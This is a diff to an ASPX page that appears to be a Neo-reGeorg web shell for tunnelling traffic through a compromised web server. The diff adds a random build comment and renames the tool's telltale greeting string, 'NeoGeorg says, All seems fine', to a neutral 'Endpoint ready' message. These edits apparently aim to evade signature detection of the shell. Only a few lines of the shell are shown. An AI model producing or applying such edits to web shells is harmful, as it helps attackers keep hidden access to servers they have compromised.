@@ -1,3 +1,4 @@
+<%-- Build: oydhcccu --%>
 <%@ Page Language="C#" EnableSessionState="True"%>
 <%@ Import Namespace="System.IO" %>
 <%@ Import Namespace="System.Net" %>
@@ -106,7 +107,7 @@
     int REDIRECTURL   = 8;
     int FORCEREDIRECT = 9;
     
-    String GeorgHello = "NeoGeorg says, 'All seems fine'";
+    String EndpointMsg = "PugGeorg says, 'Endpoint ready'";
 
     Object[] info  = new Object[40];
     Object[] rinfo = new Object[40];
@@ -256,6 +257,6 @@ if (cmd != null) {
         }
         Response.Write(StrTr(Convert.ToBase64String(blv_encode(rinfo)), en, de));
     } else {
-        Response.Write(Encoding.Default.GetString(Convert.FromBase64String(StrTr(GeorgHello, de, en))));
+        Response.Write(Encoding.Default.GetString(Convert.FromBase64String(StrTr(EndpointMsg, de, en))));
     }
 %>
